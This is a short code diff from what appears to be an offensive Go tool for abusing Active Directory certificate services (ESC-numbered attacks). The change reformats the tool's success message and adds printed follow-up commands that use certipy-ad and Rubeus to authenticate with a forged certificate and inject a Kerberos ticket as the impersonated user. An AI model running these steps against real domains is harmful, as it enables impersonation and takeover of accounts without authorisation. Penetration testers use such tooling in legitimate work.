@@ -609,10 +609,13 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	}
 
 	fmt.Printf("\n[+] Exploitation successful!\n")
-	fmt.Printf("    Exploit: %s\n", strings.ToUpper(exploit))
+	fmt.Printf("    Exploit:  ESC%s\n", escID)
 	fmt.Printf("    Template: %s\n", templateName)
-	fmt.Printf("    UPN: %s\n", upn)
-	fmt.Printf("    Output: %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
+	fmt.Printf("    UPN:      %s\n", upn)
+	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
+	fmt.Printf("\n[*] Authenticate with the certificate:\n")
+	fmt.Printf("    certipy-ad auth -pfx %s -dc-ip %s -domain %s\n", pfxPath, cfg.TargetDC, cfg.Domain)
+	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", upn, pfxPath)
 	return nil
 }
 
